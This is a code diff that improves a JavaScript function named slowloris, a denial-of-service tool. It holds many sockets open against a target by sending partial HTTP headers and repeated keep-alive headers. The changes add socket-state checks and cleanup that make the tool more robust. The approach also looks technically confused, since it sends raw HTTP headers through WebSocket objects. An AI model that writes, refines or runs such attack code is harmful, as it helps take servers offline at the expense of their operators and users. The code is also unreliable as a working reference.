@@ -62,7 +62,12 @@ function slowloris(target, numSockets) {
         function sendInitialHeader(socket, hostname, path) {
             const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
             try {
-                socket.send(initialHeader);
+                if (socket.readyState === WebSocket.OPEN) {
+                    socket.send(initialHeader);
+                } else {
+                    console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send initial header.`);
+                    cleanupSocket(socket);
+                }
             } catch (error) {
                 console.error("Error sending initial header:", error);
                 cleanupSocket(socket);
@@ -72,7 +77,12 @@ function slowloris(target, numSockets) {
         function sendKeepAliveHeader(socket) {
             const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
             try {
-                socket.send(keepAliveHeader);
+                if (socket.readyState === WebSocket.OPEN) {
+                    socket.send(keepAliveHeader);
+                } else {
+                    console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send keep-alive header.`);
+                    cleanupSocket(socket);
+                }
             } catch (error) {
                 console.error("Error sending keep-alive header:", error);
                 cleanupSocket(socket);
@@ -93,6 +103,11 @@ function slowloris(target, numSockets) {
             } finally {
                if(index !== undefined && sockets[index] === socket){
                    sockets[index] = null;
+               } else {
+                   const socketIndex = sockets.indexOf(socket);
+                   if (socketIndex > -1) {
+                       sockets[socketIndex] = null;
+                   }
                }
             }
         }
